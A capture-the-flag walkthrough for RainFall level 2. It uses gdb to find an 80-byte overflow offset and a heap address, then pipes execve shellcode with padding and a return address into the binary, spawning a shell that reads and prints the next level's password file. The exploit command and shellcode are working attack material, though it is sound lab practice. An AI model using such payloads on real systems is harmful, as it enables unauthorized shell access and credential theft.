# Level 02 Walkthrough

## Binary analysis

The binary is vulnerable to a classic buffer overflow. We need to inject shellcode and overwrite the return address to jump to a writable memory location (e.g., .bss section).

## Exploitation

Find the offset to EIP (80 bytes) with a cyclic pattern.
```
level2@RainFall:~$ gdb -q ./level2 
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) 
```

Find a writable address to jump to (e.g., using gdb or ltrace on strdup).

```
level2@RainFall:~$ gdb -q ./level2 
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) b *0x0804853e
Breakpoint 1 at 0x804853e
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x0804853e in p ()
(gdb) x/s $eax
0x804a008:	 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
```

Generate a payload with shellcode, padding (offset - len(shellcode) = 57 bytes), and the target address.

## Commands used

```
(python -c 'shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; print(shellcode + b"A" * (80 - len(shellcode)) + b"\x08\x04\xa0\x08"[::-1])'; cat -) | ./level2 
```

## Result

After running the exploit, we get a shell as level3 and can read the password:

```
X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
